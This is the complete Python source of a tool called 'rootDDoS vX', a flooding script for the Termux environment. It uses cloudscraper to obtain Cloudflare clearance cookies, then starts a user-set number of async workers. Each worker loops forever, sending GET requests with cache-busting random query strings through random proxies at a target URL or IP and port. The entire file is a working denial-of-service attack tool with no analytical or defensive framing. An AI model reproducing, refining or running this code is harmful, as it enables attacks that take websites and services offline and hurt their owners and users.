import asyncio
import aiohttp
import cloudscraper
import random
import os
import sys

# Cloudflare Bypass Engine (Termux-Friendly)
def get_valid_tokens_termux(target_url):
    print("\n[SYSTEM] INITIALIZING LIGHTWEIGHT BYPASS ENGINE...")
    try:
        scraper = cloudscraper.create_scraper()
    
        resp = scraper.get(target_url, timeout=10)
        cookie_str = "; ".join([f"{k}={v}" for k, v in resp.cookies.get_dict().items()])
        user_agent = scraper.user_agents.get_default()
        
        if "cf_clearance" in cookie_str or resp.status_code == 200:
            return cookie_str, user_agent
        return None, None
    except Exception as e:
        print(f"[CRITICAL] BYPASS FAILED: {str(e)}")
        return None, None

async def operational_strike(target, cookies, ua, proxy_list, mode):
    headers = {
        "User-Agent": ua if ua else "Mozilla/5.0 (Android 13; Mobile; rv:120.0) Root404/1.0",
        "Accept": "*/*",
        "Connection": "keep-alive"
    }
    if cookies:
        headers["Cookie"] = cookies

    connector = aiohttp.TCPConnector(limit=0, ssl=False)
    async with aiohttp.ClientSession(headers=headers, connector=connector) as session:
        while True:
            proxy = random.choice(proxy_list)
            if not proxy.startswith("http"):
                proxy = f"http://{proxy}"
            try:
                attack_url = f"{target}?s={random.getrandbits(64)}" if mode == "1" else target
                async with session.get(attack_url, proxy=proxy, timeout=5) as resp:
                    print(f"[LOG] STRIKE SUCCESS | STATUS: {resp.status} | NODE: {proxy.split('/')[-1]}")
            except:
                continue

async def main():
    os.system('clear')
    print("="*60)
    print("      rootDDoS vX | PROFESSIONAL TERMUX ENGINE")
    print("      OPERATIONAL UNIT: Root404")
    print("="*60)
    
    print("[1] URL TARGET (L7 Bypass Mode)")
    print("[2] IP TARGET (Direct Attack Mode)")
    mode = input("\n[!] SELECT OPERATION MODE: ")

    if mode == "1":
        target = input("[!] TARGET URL: ")
    else:
        ip = input("[!] TARGET IP: ")
        port = input("[!] TARGET PORT: ")
        target = f"http://{ip}:{port}"

    print("\n[!] INPUT PROXY LIST (PASTE AND PRESS CTRL+D):")
    input_data = sys.stdin.read()
    proxies = [line.strip() for line in input_data.splitlines() if line.strip()]
    
    if not proxies:
        print("[CRITICAL] NO PROXY DETECTED.")
        return

    intensity = int(input("\n[!] STRIKE INTENSITY (WORKER COUNT): "))

    cookies, ua = None, None
    if mode == "1":
        cookies, ua = get_valid_tokens_termux(target)
        if not cookies:
            print("[INFO] DIRECT STRIKE WITHOUT TOKENS...")
        else:
            print("[INFO] BYPASS SUCCESSFUL. TOKENS INJECTED.")

    print(f"\n[INFO] DEPLOYING {intensity} OPERATIONAL WORKERS...")
    tasks = [asyncio.create_task(operational_strike(target, cookies, ua, proxies, mode)) for _ in range(intensity)]
    await asyncio.gather(*tasks)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[FINALIZE] OPERATION TERMINATED.")
                
